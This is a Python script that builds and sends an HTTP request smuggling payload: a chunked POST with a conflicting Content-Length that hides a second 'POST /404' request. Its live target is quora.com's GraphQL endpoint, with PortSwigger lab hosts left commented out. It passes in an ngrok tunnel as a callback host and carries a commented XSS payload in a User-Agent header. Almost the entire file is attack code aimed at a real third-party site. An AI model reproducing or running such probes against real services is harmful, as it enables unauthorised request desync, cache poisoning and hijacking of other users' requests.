from webrequest import WebRequest
import socket
import ssl
import requests
options={'Transfer-Encoding':'chunked','Content-Type':'application/x-www-form-urlencoded'}#,'User-Agent':'<img src=x.lol onerror=alert(5)>'}
#host = 'pixabay.com'
ngrok_url = '93a3-2603-300a-1702-2b00-104b-4592-7d34-860.ngrok.io'
#port=443
port=443
host = 'quora.com'
#host = 'ac551fe51fa6a35a80dc0920000200ac.web-security-academy.net'

data='q=LoginForm_loginInfoPreview_Query\r\n'
#data = '0\r\n'
#endpoint='/login'
endpoint = '/graphql/gql_para_POST'#+'?{}'.format(data[:-2])
#host='ac971f2b1e457c2780f8719b002400a6.web-security-academy.net'

try:
    wr = WebRequest(host=host,
                    port=port,
                    ngrok=ngrok_url,
                    method='POST',
                    endpoint=endpoint,
                    http_version=1.1,
                    options=options,
                    special_formatting=False)
    #length=len(data)
    #data = '5e\r\n'
    length=len(data)
    #wr.make_custom_body(length=length,data='5e\r\nPOST /404 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n')
    #wr.make_custom_body(length=3,data='0\r\n')
    #wr.make_body(use_body_len=False,length=35,options=['POST /404 HTTP/1.1','X-Ignore: X'])
    wr.make_body(data=data,options=['POST /404 HTTP/1.1',
                          'Content-Type: application/x-www-form-urlencoded',
                          'Host: {}'.format(host),
                          #'X-Forward-For: {}'.format(ngrok_url),
                          'Content-Length: 15\r\n',
                          'x=1',
                          '0\r\n'],
                          use_body_len=False,
                          length=length)
    msg = wr.make_request_msg()
    wr.connect()
    wr.send(msg)
    wr.recv()
except Exception as e:
    print('Exception: {}'.format(e))
finally:
    wr.close()
